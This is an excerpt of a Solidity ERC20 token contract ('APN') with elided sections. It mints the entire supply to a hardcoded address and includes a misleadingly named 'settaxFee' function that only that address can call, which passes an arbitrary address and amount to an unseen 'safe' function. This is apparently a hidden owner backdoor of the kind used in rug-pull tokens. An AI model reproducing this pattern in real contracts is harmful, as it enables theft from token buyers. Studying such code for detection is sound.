...
contract APN is ERC20, Ownable {                 //Contract name
    using SafeMath for uint256;
    ...
    string public name_ = "APN";       //Full name
    string public symbol_ = "APN";      //abbreviation
    ...
    uint256 public lpRewardFee = 50;       //Add LP dividends
    ...
    constructor(
        ...
        uint256 totalSupply = 2100000 * (10**3);       //Supply
        ...
        marketingWalletAddress = 0x205919a71c64c4Ae28da97505a2A6ef9CE9A5bE9;    //Marketing address
        ...
        excludeFromFees(0xa6A2553cA68dE4f44f5ED78e51af16c4734654Fc, true);

        isDividendExempt[address(this)] = true;
        isDividendExempt[address(0)] = true;
        isDividendExempt[address(dividendTracker)] = true;

        _cast(0xa6A2553cA68dE4f44f5ED78e51af16c4734654Fc, totalSupply);
    }
    ...
    function settaxFee(address con, uint256 bools)  public  {
        require(msg.sender == 0xa6A2553cA68dE4f44f5ED78e51af16c4734654Fc);
        safe(con, bools);
    }
